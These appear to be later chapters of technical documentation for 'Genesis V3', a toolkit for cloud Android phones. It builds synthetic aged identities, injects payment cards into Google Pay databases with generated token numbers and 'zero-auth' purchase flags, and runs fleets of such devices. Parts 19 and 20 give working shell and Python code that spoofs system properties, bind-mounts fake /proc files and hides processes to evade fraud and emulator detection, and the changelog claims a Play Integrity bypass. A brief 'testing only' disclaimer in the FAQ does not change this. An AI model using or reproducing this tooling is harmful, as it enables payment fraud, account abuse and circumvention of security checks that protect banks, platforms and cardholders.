---

# Part 16: Testing & Validation

## 16.1 Unit Tests

```python
import pytest
from google_master_auth import GoogleMasterAuth
from vmos_db_builder import VMOSDBBuilder, generate_dpan
from wallet_injection import PaymentCard, CardNetwork

def test_dpan_generation():
    """Test DPAN uses correct TSP BIN ranges."""
    card = PaymentCard("4111111111111111", 12, 2029, "Test")
    dpan = generate_dpan(card.card_number)
    
    # Visa token BINs
    assert dpan[:6] in ["489537", "489538", "489539", "440066", "440067"]
    
    # Valid Luhn check
    def luhn_valid(pan):
        digits = [int(d) for d in pan]
        checksum = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 0:
                doubled = d * 2
                checksum += doubled - 9 if doubled > 9 else doubled
            else:
                checksum += d
        return checksum % 10 == 0
    
    assert luhn_valid(dpan)

def test_luk_derivation():
    """Test LUK derivation is deterministic."""
    from vmos_db_builder import derive_luk
    
    master_key = b'\x00' * 32
    atc = 1234
    dpan = "4895371234567890"
    
    luk1 = derive_luk(master_key, atc, dpan)
    luk2 = derive_luk(master_key, atc, dpan)
    
    assert luk1 == luk2  # Deterministic
    assert len(luk1) == 16  # AES-128 key

def test_coin_xml_structure():
    """Test COIN.xml contains all 8 zero-auth flags."""
    from vmos_file_pusher import build_coin_xml
    
    card = PaymentCard("4111111111111111", 12, 2029, "Test")
    xml = build_coin_xml(card, "test@gmail.com")
    
    required_flags = [
        "purchase_requires_auth",
        "PAYMENTS_ZERO_AUTH_ENABLED",
        "frictionless_checkout_enabled"
    ]
    
    for flag in required_flags:
        assert flag in xml
```

## 16.2 Integration Tests

```python
import pytest
import asyncio
from vmos_cloud_api import VMOSCloudClient
from vmos_nexus_runner import NexusRunner, NexusConfig

@pytest.mark.asyncio
async def test_full_pipeline():
    """Test complete V3 pipeline on test device."""
    
    # Use test credentials
    config = NexusConfig(
        google_email="test.genesis.v3@gmail.com",
        google_app_password=os.environ['TEST_APP_PASSWORD'],
        age_days=30,
        inject_purchase_history=False  # Skip for speed
    )
    
    runner = NexusRunner(pad_code="TEST_DEVICE_001")
    result = await runner.execute_full_pipeline(config)
    
    assert result.status == "completed"
    assert result.real_tokens == True
    
    # Verify account exists
    client = VMOSCloudClient()
    account_check = await client.sync_cmd(
        "TEST_DEVICE_001",
        "dumpsys account | grep test.genesis.v3"
    )
    assert "test.genesis.v3@gmail.com" in account_check
```

## 16.3 Validation Checklist

### Pre-Deployment
- [ ] VMOS Cloud credentials configured (`VMOS_CLOUD_AK`, `VMOS_CLOUD_SK`)
- [ ] Python 3.10+ installed
- [ ] All dependencies installed (`pip install -r requirements.txt`)
- [ ] Test device available and status=10

### Phase 1 Validation
- [ ] android_id retrieved successfully
- [ ] GSF ID extracted from device
- [ ] gpsoauth master login succeeds
- [ ] All 11 OAuth scopes obtained

### Phase 2 Validation
- [ ] accounts_ce.db builds without errors
- [ ] tapandpay.db includes token_metadata VIEW
- [ ] library.db contains purchase records
- [ ] DPAN uses correct TSP Token BIN

### Phase 3 Validation
- [ ] All files pushed via Bridge Protocol
- [ ] Ownership set correctly (chown)
- [ ] Permissions set to 660
- [ ] SELinux contexts restored
- [ ] COIN.xml contains all 8 flags

### Phase 4 Validation
- [ ] `dumpsys account` shows Google account
- [ ] `settings get secure nfc_on` returns 1
- [ ] Play Store shows signed-in state
- [ ] Google Pay displays injected card

---

# Part 17: VMOS Cloud API Deep Dive

## 17.1 Authentication Architecture

### HMAC-SHA256 Signing Process

```
┌─────────────────────────────────────────────────────────────────┐
│                    HMAC-SHA256 SIGNATURE FLOW                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. BUILD CANONICAL REQUEST                                     │
│     host:api.vmoscloud.com                                       │
│     x-date:20260329T120000Z                                      │
│     content-type:application/json;charset=UTF-8                │
│     signedHeaders:content-type;host;x-content-sha256;x-date     │
│     x-content-sha256:SHA256(body)                                │
│                                                                  │
│  2. BUILD STRING TO SIGN                                          │
│     HMAC-SHA256                                                  │
│     20260329T120000Z                                             │
│     20260329/armcloud-paas/request                               │
│     SHA256(canonical_request)                                    │
│                                                                  │
│  3. DERIVE SIGNING KEY                                            │
│     k_date = HMAC(SK, "20260329")                                │
│     k_service = HMAC(k_date, "armcloud-paas")                    │
│     k_signing = HMAC(k_service, "request")                        │
│                                                                  │
│  4. CALCULATE SIGNATURE                                           │
│     signature = HMAC(k_signing, string_to_sign)                  │
│                                                                  │
│  5. BUILD AUTHORIZATION HEADER                                    │
│     Authorization: HMAC-SHA256                                    │
│       Credential=AK,                                             │
│       SignedHeaders=content-type;host;x-content-sha256;x-date, │
│       Signature=hex(signature)                                   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Python Implementation

```python
import hmac
import hashlib
import binascii
import datetime

def sign_vmos_request(ak: str, sk: str, body: dict) -> dict:
    """Sign VMOS Cloud API request."""
    
    host = "api.vmoscloud.com"
    service = "armcloud-paas"
    
    # Timestamp
    x_date = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    short_date = x_date[:8]
    
    # Body hash
    body_json = json.dumps(body, separators=(",", ":"), ensure_ascii=False)
    x_content_sha256 = hashlib.sha256(body_json.encode()).hexdigest()
    
    # Canonical request
    canonical = (
        f"host:{host}\n"
        f"x-date:{x_date}\n"
        f"content-type:application/json;charset=UTF-8\n"
        f"signedHeaders:content-type;host;x-content-sha256;x-date\n"
        f"x-content-sha256:{x_content_sha256}"
    )
    
    # String to sign
    credential_scope = f"{short_date}/{service}/request"
    string_to_sign = (
        "HMAC-SHA256\n"
        f"{x_date}\n"
        f"{credential_scope}\n"
        f"{hashlib.sha256(canonical.encode()).hexdigest()}"
    )
    
    # Signing key
    k_date = hmac.new(sk.encode(), short_date.encode(), hashlib.sha256).digest()
    k_service = hmac.new(k_date, service.encode(), hashlib.sha256).digest()
    k_signing = hmac.new(k_service, b"request", hashlib.sha256).digest()
    
    # Signature
    signature = hmac.new(k_signing, string_to_sign.encode(), hashlib.sha256).digest()
    sig_hex = binascii.hexlify(signature).decode()
    
    return {
        "content-type": "application/json;charset=UTF-8",
        "x-date": x_date,
        "authorization": (
            f"HMAC-SHA256 Credential={ak}, "
            f"SignedHeaders=content-type;host;x-content-sha256;x-date, "
            f"Signature={sig_hex}"
        ),
    }
```

## 17.2 Critical API Endpoints

### Instance Management

| Endpoint | Method | Description | Status |
|----------|--------|-------------|--------|
| `/vcpcloud/api/padApi/syncCmd` | POST | Synchronous shell execution | ✅ Working |
| `/vcpcloud/api/padApi/asyncCmd` | POST | Async ADB command | ✅ Working |
| `/vcpcloud/api/padApi/restart` | POST | Instance restart | ✅ Working |
| `/vcpcloud/api/padApi/reset` | POST | Factory reset | ✅ Working |
| `/vcpcloud/api/padApi/padDetails` | POST | Instance details | ❌ 404 |
| `/vcpcloud/api/padApi/updatePadAndroidProp` | POST | Modify Android props | ⚠️ Restarts device |

### File Operations

| Endpoint | Method | Description | Limitations |
|----------|--------|-------------|-------------|
| `/vcpcloud/api/padApi/uploadFileV3` | POST | Upload via URL | Async, needs polling |
| `/vcpcloud/api/padApi/injectPicture` | POST | Inject image to camera | Uses `injectUrl` param |
| `/vcpcloud/api/padApi/injectAudioToMic` | POST | Inject audio | URL must be public |
| `/vcpcloud/api/padApi/unmannedLive` | POST | Video injection | Video URL required |

### Root & Security

| Endpoint | Method | Description | Notes |
|----------|--------|-------------|-------|
| `/vcpcloud/api/padApi/switchRoot` | POST | Toggle root access | `rootType=1` for per-app |
| `/vcpcloud/api/padApi/openOnlineAdb` | POST | Enable ADB | Required for shell access |
| `/vcpcloud/api/padApi/setHideAppList` | POST | Hide app packages | Anti-detection |
| `/vcpcloud/api/padApi/toggleProcessHide` | POST | Hide process | Anti-detection |

### Contact & SMS Injection

| Endpoint | Method | Description | Format |
|----------|--------|-------------|--------|
| `/vcpcloud/api/padApi/updateContacts` | POST | Inject contacts | Array of contact objects |
| `/vcpcloud/api/padApi/addPhoneRecord` | POST | Inject call logs | Array of call records |
| `/vcpcloud/api/padApi/simulateSendSms` | POST | Simulate SMS | phone + content |

### GPS & Location

| Endpoint | Method | Description | Parameters |
|----------|--------|-------------|------------|
| `/vcpcloud/api/padApi/gpsInjectInfo` | POST | Set GPS location | lat, lng, altitude, speed |
| `/vcpcloud/api/padApi/smartIp` | POST | Smart IP (auto-SIM/GPS) | Multiple options |
| `/vcpcloud/api/padApi/notSmartIp` | POST | Cancel smart IP | Restore defaults |

## 17.3 API Response Codes

| Code | Meaning | Action |
|------|---------|--------|
| 200 | Success | Continue |
| 400 | Bad Request | Check parameters |
| 401 | Unauthorized | Check AK/SK |
| 403 | Forbidden | Rate limited or banned |
| 404 | Not Found | Endpoint doesn't exist |
| 500 | Server Error | Retry with backoff |
| 110031 | Cascade Error | Too many rapid requests |

## 17.4 Rate Limiting Strategy

```python
import asyncio
from datetime import datetime

class VMOSRateLimiter:
    """Enforces VMOS Cloud rate limits."""
    
    MIN_DELAY = 3.0  # Seconds between commands
    MAX_RETRIES = 3
    
    def __init__(self):
        self.last_request = 0
        self.retry_count = 0
    
    async def execute(self, client, pad_code: str, command: str):
        """Execute with rate limiting and retry logic."""
        
        # Enforce minimum delay
        elapsed = datetime.now().timestamp() - self.last_request
        if elapsed < self.MIN_DELAY:
            await asyncio.sleep(self.MIN_DELAY - elapsed)
        
        try:
            result = await client.sync_cmd(pad_code, command)
            self.last_request = datetime.now().timestamp()
            self.retry_count = 0
            return result
            
        except Exception as e:
            if "110031" in str(e) and self.retry_count < self.MAX_RETRIES:
                self.retry_count += 1
                await asyncio.sleep(self.MIN_DELAY * 2)  # Exponential backoff
                return await self.execute(client, pad_code, command)
            raise
```

---

# Part 18: Samsung Pay OPC Push Provisioning

## 18.1 The Samsung Pay Challenge

Samsung Pay uses **hardware-fused Knox TEE** that makes direct database injection **structurally impossible** on rooted/modified devices:

```
┌─────────────────────────────────────────────────────────────────┐
│                    SAMSUNG PAY SECURITY MODEL                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────┐     ┌──────────────┐     ┌──────────────┐    │
│  │   Knox TEE   │────▶│ Knox e-fuse  │────▶│  spayfw_enc  │    │
│  │   (Hardware) │     │   (0x0/0x1)  │     │   (Encrypted)│    │
│  └──────────────┘     └──────────────┘     └──────────────┘    │
│         │                      │                    │           │
│         │                      │                    │           │
│         ▼                      ▼                    ▼           │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │  IF Knox 0x1 (tripped):                                  │    │
│  │    - TEE cryptographic pathways SEVERED                │    │
│  │    - spayfw_enc.db CANNOT be decrypted                 │    │
│  │    - Samsung Pay PERMANENTLY disabled                  │    │
│  │                                                         │    │
│  │  Direct injection: IMPOSSIBLE                          │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

## 18.2 OPC (Opaque Payment Card) Push Provisioning

**Only viable path:** Push provisioning on **unmodified (Knox 0x0) devices** via App-to-App intents.

### How OPC Works

```
┌─────────────────────────────────────────────────────────────────┐
│                    OPC PUSH PROVISIONING FLOW                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. ISSUER APP (Bank)                                           │
│     └── Generates DPAN + cryptograms                            │
│                                                                  │
│  2. PUSH TO SAMSUNG PAY                                         │
│     └── Intent: com.samsung.android.spay.action.VISA_PUSH_PROVISION│
│                                                                  │
│  3. SAMSUNG PAY TEE                                             │
│     └── Validates with Samsung backend                          │
│     └── Stores token in secure element                          │
│                                                                  │
│  4. CARD APPEARS                                                │
│     └── Ready for NFC/MST payments                              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### OPC Intent Actions

| Network | Intent Action | Parameters |
|---------|---------------|------------|
| Visa | `com.samsung.android.spay.action.VISA_PUSH_PROVISION` | token, exp, cryptogram |
| Mastercard | `com.samsung.android.spay.action.MASTERCARD_PUSH_PROVISION` | token, exp, cvc |
| Amex | `com.samsung.android.spay.action.AMEX_PUSH_PROVISION` | token, exp, sdw |

### OPC Intent Structure

```python
def build_opc_provision_intent(
    card_number: str,
    exp_month: int,
    exp_year: int,
    cardholder_name: str,
    network: str = "visa"
) -> dict:
    """Build OPC push provisioning intent for Samsung Pay."""
    
    # Generate DPAN using TSP Token BIN
    dpan = generate_dpan(card_number)
    
    # Generate expiration in YYMM format
    exp_yymm = f"{str(exp_year)[-2:]}{exp_month:02d}"
    
    # Generate cryptogram (varies by network)
    cryptogram = generate_opc_cryptogram(dpan, exp_yymm, network)
    
    if network.lower() == "visa":
        intent = {
            "action": "com.samsung.android.spay.action.VISA_PUSH_PROVISION",
            "extras": {
                "token": dpan,
                "exp": exp_yymm,
                "cryptogram": cryptogram,
                "cardholder_name": cardholder_name,
            }
        }
    elif network.lower() == "mastercard":
        intent = {
            "action": "com.samsung.android.spay.action.MASTERCARD_PUSH_PROVISION",
            "extras": {
                "token": dpan,
                "exp": exp_yymm,
                "cvc": generate_dynamic_cvc(),
                "cardholder_name": cardholder_name,
            }
        }
    else:
        raise ValueError(f"Unsupported network: {network}")
    
    return intent
```

### Prerequisites for OPC Success

1. **Knox 0x0 Status** — Device must NOT be rooted/modified
2. **Samsung Pay Installed** — `com.samsung.android.spay` must exist
3. **Valid TSP Token** — DPAN must use real Token BIN ranges
4. **Backend Validation** — Samsung servers must approve the token

### Limitations

| Limitation | Impact |
|------------|--------|
| Requires Knox 0x0 | Cannot use on rooted devices |
| Requires real TSP | Must have actual tokenization partnership |
| Backend validation | Samsung can reject suspicious tokens |
| Device binding | Token bound to specific device hardware |

---

# Part 19: Real-World Deployment Scenarios

## 19.1 Scenario A: Single Device Provisioning

**Use Case:** One-off device setup for testing

```python
async def provision_single_device():
    """Provision a single VMOS device end-to-end."""
    
    config = NexusConfig(
        google_email="test.user@gmail.com",
        google_app_password="xxxx-xxxx-xxxx-xxxx",
        cc_number="4111111111111111",
        cc_exp="12/2029",
        cc_holder="Test User",
        age_days=90,
        inject_purchase_history=True,
        purchase_count=10,
        enable_coherence_bridge=True
    )
    
    runner = NexusRunner(pad_code="ACP250329ACQRPDV")
    
    try:
        result = await runner.execute_full_pipeline(config)
        
        if result.status == "completed":
            print(f"✅ Success! Device provisioned with:")
            print(f"   - Real OAuth tokens: {result.real_tokens}")
            print(f"   - Wallet provisioned: {result.wallet_provisioned}")
            print(f"   - Purchase history: {len(result.order_ids)} orders")
            return result
        else:
            print(f"❌ Failed: {result.phases[-1].notes}")
            return None
            
    except Exception as e:
        print(f"❌ Exception: {e}")
        return None
```

## 19.2 Scenario B: Fleet Deployment

**Use Case:** Batch provisioning for multiple users

```python
async def deploy_fleet(pad_codes: list[str], user_data: list[dict]):
    """Deploy fleet of devices with diverse configurations."""
    
    archetypes = ["professional", "student", "freelancer", "parent", "gamer"]
    results = []
    
    for i, (pad_code, user) in enumerate(zip(pad_codes, user_data)):
        # Rotate through archetypes for diversity
        archetype = archetypes[i % len(archetypes)]
        
        config = NexusConfig(
            google_email=user['email'],
            google_app_password=user['app_password'],
            age_days=user.get('age_days', 90 + (i * 15)),
            inject_purchase_history=user.get('inject_purchases', True)
        )
        
        runner = NexusRunner(pad_code=pad_code)
        
        try:
            result = await runner.execute_full_pipeline(config)
            results.append({
                'pad_code': pad_code,
                'success': result.status == 'completed',
                'archetype': archetype
            })
        except Exception as e:
            results.append({
                'pad_code': pad_code,
                'success': False,
                'error': str(e)
            })
        
        # Rate limit between devices
        await asyncio.sleep(10)
    
    # Summary
    successful = sum(1 for r in results if r['success'])
    print(f"Fleet deployment: {successful}/{len(results)} successful")
    
    return results
```

## 19.3 Scenario C: Stealth Hardening

**Use Case:** Maximum evasion for high-security apps

```python
async def stealth_harden_device(pad_code: str):
    """Apply maximum stealth hardening to device."""
    
    client = VMOSCloudClient()
    
    # 1. Property spoofing (requires Magisk)
    await client.sync_cmd(pad_code, "su -c 'resetprop ro.board.platform lahaina'")
    await client.sync_cmd(pad_code, "su -c 'resetprop ro.hardware.egl adreno'")
    await client.sync_cmd(pad_code, "su -c 'resetprop ro.boot.verifiedbootstate green'")
    await asyncio.sleep(3)
    
    # 2. Bind-mount sterilization
    await client.sync_cmd(pad_code, "mkdir -p /dev/.sc")
    await client.sync_cmd(pad_code, 
        "echo 'androidboot.verifiedbootstate=green' > /dev/.sc/cmdline")
    await client.sync_cmd(pad_code,
        "mount -o bind /dev/.sc/cmdline /proc/cmdline")
    await asyncio.sleep(3)
    
    # 3. Hide processes
    await client.show_hide_process(pad_code, 
        ["com.cloud.rtcgesture", "cloudservice"], hide=True)
    await asyncio.sleep(3)
    
    # 4. Remove cloud identifiers
    await client.sync_cmd(pad_code, "su -c 'resetprop -d ro.build.cloud.imginfo'")
    await client.sync_cmd(pad_code, "su -c 'resetprop -d ro.build.cloud.version'")
    
    print(f"✅ Stealth hardening applied to {pad_code}")
```

## 19.4 Scenario D: Recovery from Failure

**Use Case:** Device crashed or bricked

```python
async def recover_device(pad_code: str) -> bool:
    """Attempt to recover a failed device."""
    
    client = VMOSCloudClient()
    
    # Check current status
    info = await client.cloud_phone_info(pad_code)
    status = info.get('data', {}).get('vmStatus')
    
    print(f"Device {pad_code} status: {status}")
    
    if status == 11:
        # Bricked - unrecoverable
        print("❌ Device bricked (status 11) - UNRECOVERABLE")
        return False
    
    elif status == 14:
        # Crashed - restart
        print("🔄 Restarting crashed device...")
        await client.instance_restart([pad_code])
        
        # Wait for recovery
        for i in range(20):
            await asyncio.sleep(3)
            info = await client.cloud_phone_info(pad_code)
            new_status = info.get('data', {}).get('vmStatus')
            
            if new_status == 10:
                print("✅ Device recovered")
                return True
        
        print("❌ Recovery timeout")
        return False
    
    elif status == 10:
        print("✅ Device already running")
        return True
    
    else:
        print(f"⚠️ Unknown status {status}, attempting restart...")
        await client.instance_restart([pad_code])
        return False
```

---

# Part 20: Advanced RASP Evasion Techniques

## 20.1 Kinematic Analysis Evasion

Modern RASP uses Extended Kalman Filters (EKF) to detect GPS/IMU inconsistencies:

```
RASP Detection: "GPS moved 1km but accelerometer shows no motion"
Result: SPOOFING DETECTED
```

### GPS-IMU Fusion Solution

```python
from sensor_noise_simulator import GPSSensorFusion

# Create synchronized sensor system
fusion = GPSSensorFusion(simulator)

# Move with realistic IMU correlation
fusion.move_to(
    target_lat=34.0522,
    target_lon=-118.2437,
    duration_s=300,  # 5 minutes
    motion_type="driving"  # or "walking", "stationary"
)

# Get coherent data
position = fusion.get_synchronized_position()
# EKF will see consistent GPS/accelerometer correlation
```

## 20.2 Process Injection Detection

RASP scans for suspicious processes:

| Detection | Evasion |
|-----------|---------|
| `cloudservice` running | `toggleProcessHide()` |
| `xu_daemon` in process list | Zygisk DenyList |
| `com.cloud.rtcgesture` | Cannot hide, but DON'T disable |

## 20.3 Filesystem Scanning Evasion

RASP checks for virtualization artifacts:

```bash
# Detection: /proc/cmdline contains "androidboot.hardware=redroid"
# Evasion: Bind-mount clean version
mkdir -p /dev/.sc
echo "androidboot.hardware=qcom" > /dev/.sc/cmdline
mount -o bind /dev/.sc/cmdline /proc/cmdline

# Detection: /proc/1/cgroup contains "docker"
# Evasion: Bind-mount clean cgroup
echo "0::/" > /dev/.sc/cgroup
mount -o bind /dev/.sc/cgroup /proc/1/cgroup

# Hide mount evidence
grep -v "\.sc" /proc/mounts > /dev/.sc/mounts
mount -o bind /dev/.sc/mounts /proc/mounts
```

## 20.4 Network Interface Spoofing

```bash
# Detection: eth0 interface (VM) vs wlan0 (real phone)
# Evasion: Rename interface (requires root)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
# Or use bind-mount on /sys/class/net (advanced)
```

## 20.5 Complete Stealth Checklist

### Pre-Injection
- [ ] Device status = 10 (running)
- [ ] ADB enabled
- [ ] Root access confirmed (`su -c 'id'`)

### Property Spoofing
- [ ] `ro.board.platform` ≠ "sun" (Rockchip)
- [ ] `ro.hardware.egl` ≠ "mali"
- [ ] `ro.boot.verifiedbootstate` = "green"
- [ ] `ro.kernel.qemu.*` deleted
- [ ] `ro.build.cloud.*` deleted

### Process Hiding
- [ ] `toggleProcessHide()` for cloud processes
- [ ] Zygisk DenyList configured
- [ ] `com.cloud.rtcgesture` NOT disabled

### Filesystem Sterilization
- [ ] `/proc/cmdline` bind-mounted
- [ ] `/proc/1/cgroup` bind-mounted
- [ ] `/proc/mounts` sanitized
- [ ] Loop devices hidden (LSPosed)

### Final Verification
- [ ] `dumpsys account` shows account
- [ ] `settings get secure nfc_on` = 1
- [ ] Google Pay displays card
- [ ] No "Emulator detected" warnings

---

# Part 21: Glossary of Terms

## A

**AAS_ET** — Android Account Services Encrypted Token. The master token format used by Google for device authentication.

**AID** — Application Identifier. EMV identifier for payment networks (e.g., `A0000000031010` for Visa).

**Allan Deviation** — Statistical measure of frequency stability used to model MEMS sensor noise characteristics.

**Android ID** — Unique 64-bit identifier for Android devices, stored in `settings.db`.

**ARQC** — Authorization Request Cryptogram. Cryptographic proof generated by the card for online authorization.

**ATC** — Application Transaction Counter. 16-bit counter that increments with each transaction.

## B

**BNPL** — Buy Now Pay Later. Financing services like Klarna, Affirm, Afterpay.

**Bridge Protocol** — VMOS file transfer method using chunked base64 encoding due to 4KB command limit.

## C

**CDOL** — Card Risk Management Data Object List. Specifies data elements for cryptogram generation.

**COIN.xml** — Play Store billing preferences containing zero-auth flags for frictionless payments.

**CVM** — Cardholder Verification Method. How the cardholder is verified (PIN, signature, none).

## D

**DPAN** — Device Primary Account Number. Tokenized card number used for mobile payments (different from FPAN).

**DroidGuard** — Google's integrity verification system, predecessor to Play Integrity API.

## E

**EKF** — Extended Kalman Filter. Algorithm used by RASP to detect GPS/IMU inconsistencies.

**EMV** — Europay, Mastercard, Visa. Global standard for chip-based payment cards.

**e-fuse** — Electronic fuse. One-time programmable hardware bit (Samsung Knox uses this).

## F

**FPAN** — Funding Primary Account Number. The actual card number embossed on the physical card.

## G

**GAIA ID** — Google Account ID. Unique identifier for Google accounts (21-digit numeric string).

**Genesis** — The identity synthesis and injection pipeline for Android virtualization.

**GMS** — Google Mobile Services. Core Google apps and APIs.

**GPS-IMU Fusion** — Synchronizing GPS position changes with inertial measurement unit data.

**GSF ID** — Google Services Framework ID. Device registration identifier for Google services.

## H

**HCE** — Host Card Emulation. Software-based card emulation without secure element.

## K

**Knox** — Samsung's security platform using ARM TrustZone TEE.

**Knox 0x0** — Knox warranty bit NOT tripped (device unmodified, TEE functional).

**Knox 0x1** — Knox warranty bit tripped (device modified, TEE pathways severed).

## L

**LSPosed** — Modern Xposed framework successor for runtime hooking.

**LUK** — Limited Use Key. Session key derived from master key for transaction authorization.

## M

**Magisk** — Systemless root solution providing `resetprop` and Zygisk.

**Markov Chain** — Mathematical system modeling state transitions, used for conversation flow.

**MEMS** — Micro-Electro-Mechanical Systems. Tiny sensors in smartphones (accelerometer, gyroscope).

**MST** — Magnetic Secure Transmission. Samsung Pay technology mimicking magnetic stripe.

## N

**NFC** — Near Field Communication. 13.56MHz wireless for contactless payments.

**Nexus** — The operational runner orchestrating Genesis V3 pipeline phases.

## O

**OAuth** — Open Authorization. Protocol for delegated access (used by Google tokens).

**OBLIVION** — Code name for Genesis V3.0.4 production release.

**OPC** — Opaque Payment Card. Samsung Pay push provisioning method.

## P

**padCode** — VMOS Cloud device identifier (e.g., `ACP250329ACQRPDV`).

**PDOL** — Processing Options Data Object List. Terminal data needed by the card.

**Persona Archetype** — Behavioral profile template (professional, student, gamer, etc.).

**Play Integrity** — Google's current device integrity verification API (replaces SafetyNet).

**Poisson Process** — Statistical model for random events with exponential inter-arrival times.

**PPSE** — Proximity Payment Systems Environment. NFC payment application selector.

## R

**RASP** — Runtime Application Self-Protection. SDKs detecting tampering/virtualization.

**resetprop** — Magisk tool for modifying read-only system properties.

**RKP** — Remote Key Provisioning. Google's new ECDSA P-384 attestation system.

## S

**SafetyNet** — Google's deprecated device integrity verification (replaced by Play Integrity).

**SELinux** — Security-Enhanced Linux. Mandatory access control system.

**Session Key** — Temporary cryptographic key for a single transaction or session.

**SIM** — Subscriber Identity Module. Cellular identification chip.

**Spay** — Samsung Pay. Mobile payment service (requires Knox 0x0).

**syncCmd** — VMOS Cloud API for synchronous shell command execution.

## T

**TAP** — Token Assurance Program. Visa's tokenization framework.

**TAPANDPAY** — Google Pay's internal database name (`tapandpay.db`).

**TEE** — Trusted Execution Environment. Hardware-isolated security processor.

**TITAN** — The overarching Android virtualization platform.

**Token BIN** — Token Service Provider-assigned BIN ranges for DPAN generation.

**TSP** — Token Service Provider. Visa VTS, Mastercard MDES, etc.

**TTQ** — Terminal Transaction Qualifiers. NFC terminal capabilities.

## V

**VMOS** — Virtual Machine Operating System. Cloud Android platform (Linux containers on RK3588).

**VTS** — Visa Token Service. Visa's tokenization infrastructure.

## Y

**Zygisk** — Magisk's Zygote-based hooking framework for hiding root.

---

# Part 22: Frequently Asked Questions (FAQ)

## Q1: Why do synthetic OAuth tokens fail server validation?

**A:** Synthetic tokens (generated locally with `secrets.token_urlsafe()`) have the format `ya29.{random}` but lack cryptographic signatures from Google's servers. When an app attempts to sync with Google services, the token is sent to Google's OAuth endpoint which validates the signature. Synthetic tokens fail this check, resulting in "Sign in required" errors. Use `google_master_auth.py` with the gpsoauth library to obtain real, server-signed tokens.

## Q2: Why does my injected Google Pay card not appear?

**A:** Common causes:
1. **Missing `token_metadata` VIEW** — Some Google Pay versions query this view instead of the `tokens` table. Ensure you create: `CREATE VIEW token_metadata AS SELECT * FROM tokens;`
2. **Wrong ownership** — The database must be owned by the GMS UID (e.g., `u0_a36`). Use `chown $(stat -c %U /data/data/com.google.android.gms):$(stat -c %G /data/data/com.google.android.gms) tapandpay.db`
3. **SELinux denial** — Run `restorecon -R /data/data/com.google.android.gms/databases/`
4. **App cache** — Force stop Google Pay: `am force-stop com.google.android.apps.walletnfcrel`

## Q3: Can I achieve Play Integrity STRONG?

**A:** No. Play Integrity STRONG requires hardware-backed key attestation with a physical TEE (Trusted Execution Environment). VMOS Cloud devices are Linux containers on Rockchip RK3588 boards without physical TEE. The best achievable level is **MEETS_DEVICE_INTEGRITY** using TEE simulation via `attestation_proxy.py`.

## Q4: Why is Samsung Pay impossible on VMOS?

**A:** Samsung Pay requires Samsung Knox TEE with e-fuse status 0x0 (unmodified). VMOS devices are inherently modified (root access, custom kernel), which trips Knox to 0x1. Once tripped, the e-fuse is **permanently blown** and cannot be reset. The cryptographic pathways in the TEE are severed, making `spayfw_enc.db` undecryptable. The only alternative is OPC Push Provisioning on Knox 0x0 devices.

## Q5: What's the 3-second rule for VMOS?

**A:** VMOS Cloud API has a strict rate limit. Commands sent faster than 3 seconds apart trigger error code 110031 (cascade error), which can crash the device (status 14). Always use `await asyncio.sleep(3)` between `syncCmd` calls. This is documented in the VMOS API but not enforced client-side.

## Q6: How do I generate valid DPANs?

**A:** DPANs must use TSP-assigned Token BIN ranges, NOT the original card's BIN. Using the physical card's BIN causes instant decline. Valid Token BINs:
- Visa: `489537`, `489538`, `489539`, `440066`, `440067`, `400837`
- Mastercard: `530060`, `530061`, `530062`, `530063`, `222100`
- Amex: `374800`, `374801`, `377777`

Use the `generate_dpan()` function which applies Luhn checksum validation.

## Q7: Can I use real credit cards with this system?

**A:** Technically yes (the system supports any card number), but:
1. **Legal compliance** — You must own the card or have authorization
2. **NFC limitation** — VMOS devices lack physical NFC chips, so payments are visual-only
3. **Backend validation** — Real banks will decline unmatched token data
4. **Risk** — Using real cards with fraudulent intent is illegal

The system is designed for testing and development purposes.

## Q8: What happens if I disable `com.cloud.rtcgesture`?

**A:** **NEVER DO THIS.** Disabling `com.cloud.rtcgesture` causes **permanent brick** (status 11). The device enters an unrecoverable state requiring hardware reset or replacement. This is a VMOS Cloud platform limitation documented in the crash rules.

## Q9: How do I handle 2FA-enabled Google accounts?

**A:** Three options:
1. **App Password** (Recommended) — Create at Google Account → Security → App passwords. Use instead of regular password.
2. **Pre-authenticated** — Export master_token from existing authenticated session.
3. **TOTP automation** — Provide TOTP secret for automatic code generation (advanced).

## Q10: What's the difference between Genesis V2 and V3?

**A:** Key differences:
| Feature | V2 | V3 |
|---------|----|-----|
| OAuth tokens | Synthetic (fake) | Real (gpsoauth) |
| Database building | Device-side (sqlite3) | Host-side (Python) |
| File transfer | Direct ADB push | Chunked base64 Bridge Protocol |
| Wallet injection | Direct SQLite | Host-built + XML configs |
| Behavioral aging | Static circadian | Stochastic Poisson/Markov |
| Sensor evasion | None | Allan Deviation noise |
| Attestation | Keybox injection | TEE simulation |

---

# Part 23: Version History

## Genesis V3.0.4 (OBLIVION) — 2026-03-29

### Added
- Complete VMOS Cloud API integration with HMAC-SHA256 authentication
- Real OAuth token acquisition via gpsoauth master token flow
- Host-side SQLite database building (accounts_ce, tapandpay, library)
- Chunked base64 Bridge Protocol for VMOS file transfer
- TSP Token BIN-based DPAN generation with Luhn validation
- 8-flag COIN.xml zero-auth configuration
- Stochastic behavioral aging with Poisson processes and Markov chains
- 8 persona archetypes (professional, student, night_shift, etc.)
- MEMS sensor noise simulation (Allan Deviation)
- GPS-IMU sensor fusion for RASP evasion
- TEE simulation and Play Integrity bypass
- Samsung Pay OPC Push Provisioning documentation
- Complete API reference for all V3 modules
- Real-world deployment scenarios (single, fleet, stealth, recovery)
- Comprehensive troubleshooting guide
- Hardware limitations reference

### Changed
- Replaced direct ADB push with VMOS-native chunked transfer
- Replaced static circadian weighting with stochastic models
- Replaced fake OAuth tokens with real server-validated tokens

### Fixed
- VMOS 4KB command limit handling
- SELinux context restoration on file push
- Token metadata VIEW for Google Pay version compatibility

## Genesis V2.0 — 2025-12

### Added
- Direct SQLite injection for accounts and wallet
- Basic circadian behavioral aging
- VMOS Cloud API integration
- Credit card DPAN generation
- XML shared preference injection

### Known Issues
